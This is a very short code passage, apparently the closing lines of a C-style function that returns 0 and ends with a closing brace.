    return 0;

}
